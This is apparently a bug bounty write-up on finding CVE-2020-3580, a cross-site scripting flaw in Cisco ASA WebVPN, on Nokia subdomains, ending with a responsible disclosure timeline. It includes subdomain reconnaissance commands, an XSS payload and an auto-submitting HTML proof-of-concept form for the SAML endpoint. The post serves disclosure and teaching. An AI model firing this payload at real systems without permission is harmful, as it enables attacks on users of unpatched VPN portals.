---
title:  "Exploiting Cisco ASA CVE-2020-3580: How I Discovered the Vulnerability on Nokia Subdomains"
layout: post
---

```markdown
# Uncovering CVE-2020-3580 on Nokia Subdomains

Cisco Adaptive Security Appliance (ASA) is a tool used for corporate VPN access, firewall protection, and threat management. However, it is not without its vulnerabilities. One such vulnerability, **CVE-2020-3580**, was discovered in 2020 and affects the WebVPN portal, allowing attackers to execute cross-site scripting (XSS) attacks that could compromise connected systems.

In this post, I’ll explain how I uncovered this vulnerability on various Nokia subdomains using reconnaissance techniques.

## Reconnaissance

The first step in bug bounty hunting or vulnerability research is always reconnaissance. My goal was to map out the Nokia attack surface to find potentially vulnerable assets, and for that, I leveraged several tools and methods.

### 1. Passive Reconnaissance

I started with passive recon to gather subdomains and IPs associated with Nokia. For this, I used the following tools and techniques:

#### Subdomain Enumeration

I used tools like **Sublist3r**, **Amass**, and **Subfinder** to gather a large list of Nokia subdomains:

```bash
subfinder -d nokia.com -o nokia-subdomains.txt
amass enum -d nokia.com -o nokia-amass.txt
```

This provided a list of subdomains that are publicly known and might host various services, including VPN portals.

After gathering subdomains, I looked for endpoints that were hosting web interfaces. Using tools like **httpx**, I quickly fingerprinted these subdomains to check for VPN interfaces, login pages, or any Cisco ASA systems:

```bash
cat subdomains.txt | httpx -status-code -title -tech-detect
```

Many subdomains returned HTTP 200 with Cisco VPN or WebVPN portals exposed.

## Testing for CVE-2020-3580

To test for the vulnerability, we need to send a POST request to `/+CSCOE+/saml/sp/acs?tgname=a` with the **SAMLResponse** parameter set to a payload that triggers the XSS vulnerability. The payload is:

```html
'><svg/onload=alert('xss')>
```

### Steps to Reproduce:

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://████/+CSCOE+/saml/sp/acs?tgname=a" method="POST">
      <input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
      <input type="hidden" name="" value="" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CVE-2020-3580 on Nokia Subdomains

I wrote a Bash script to check each of the subdomains for this vulnerability. Many of the subdomains were found to be vulnerable, and I reported them to Nokia through their responsible disclosure policy.

## Disclosure Timelines:

- **17 Aug 2022:** Vulnerability discovered and reported.  
- **18 Aug 2022:** Team confirmed receipt of the report.  
- **20 Aug 2022:** I earned a spot on their Hall of Fame page.
```

